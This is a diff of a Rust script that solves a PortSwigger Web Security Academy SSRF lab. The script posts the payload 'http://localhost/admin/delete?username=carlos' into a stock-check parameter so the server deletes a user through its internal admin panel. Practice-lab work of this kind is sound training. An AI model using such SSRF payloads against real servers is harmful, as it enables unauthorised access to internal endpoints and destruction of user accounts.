@@ -1,23 +1,15 @@
-/***************************************************************************************
-*
-* Author: Ahmed Elqalaawy (@elqal3awii)
-*
-* Date: 18/10/2023
+/**************************************************************************
 *
 * Lab: Basic SSRF against the local server
 *
-* Steps: 1. Inject payload into 'stockApi' parameter to delete carlos using SSRF
-*           against the local server
-*        2. Check that carlos doesn't exist anymore in the admin panel
+* Hack Steps:
+*      1. Inject payload into 'stockApi' parameter to delete carlos using
+*         SSRF against the local server
+*      2. Check that carlos doesn't exist anymore in the admin panel
 *
-****************************************************************************************/
-#![allow(unused)]
-/***********
-* Imports
-***********/
+***************************************************************************/
 use reqwest::{
     blocking::{Client, ClientBuilder, Response},
-    header::HeaderMap,
     redirect::Policy,
 };
 use std::{
@@ -27,52 +19,34 @@ use std::{
 };
 use text_colorizer::Colorize;
 
-/******************
-* Main Function
-*******************/
+// Change this to your lab URL
+const LAB_URL: &str = "https://0a49000b040fb67583979da700be00d6.web-security-academy.net";
+
 fn main() {
-    // change this to your lab URL
-    let url = "https://0a97003b0458f0eb80d43ae600630018.web-security-academy.net";
+    println!("⦗#⦘ Injection point: {}", "stockApi".yellow());
+    print!("❯❯ Injecting payload to delete carlos using SSRF against the local server.. ");
+    io::stdout().flush().unwrap();
 
-    // build the client that will be used for all subsequent requests
-    let client = build_client();
-
-    println!("{} {}", "⟪#⟫ Injection point:".blue(), "stockApi".yellow(),);
-
-    // payload to delete carlos
     let payload = "http://localhost/admin/delete?username=carlos";
+    check_stock_with_payload(&payload);
 
-    print!(
-        "{}",
-        "❯ Injecting payload to delete carlos using SSRF against the local server.. ".white(),
-    );
-    io::stdout().flush();
+    println!("{}", "OK".green());
+    println!("🗹 The lab should be marked now as {}", "solved".green())
+}
 
-    // fetch the page with the injected payload
-    client
-        .post(format!("{url}/product/stock"))
-        .form(&HashMap::from([("stockApi", payload)]))
+fn check_stock_with_payload(payload: &str) -> Response {
+    let cliet = build_web_client();
+    cliet
+        .post(format!("{LAB_URL}/product/stock"))
+        .form(&HashMap::from([("stockApi", &payload)]))
         .send()
         .expect(&format!(
             "{}",
-            "[!] Failed to fetch the page with the injected payload".red()
-        ));
-
-    println!("{}", "OK".green());
-    println!(
-        "{} {}",
-        "🗹 The lab should be marked now as"
-            .white()
-            .bold(),
-        "solved".green().bold()
-    )
+            "⦗!⦘ Failed to fetch the page with the injected payload".red()
+        ))
 }
 
-/*******************************************************************
-* Function used to build the client
-* Return a client that will be used in all subsequent requests
-********************************************************************/
-fn build_client() -> Client {
+fn build_web_client() -> Client {
     ClientBuilder::new()
         .redirect(Policy::none())
         .connect_timeout(Duration::from_secs(5))
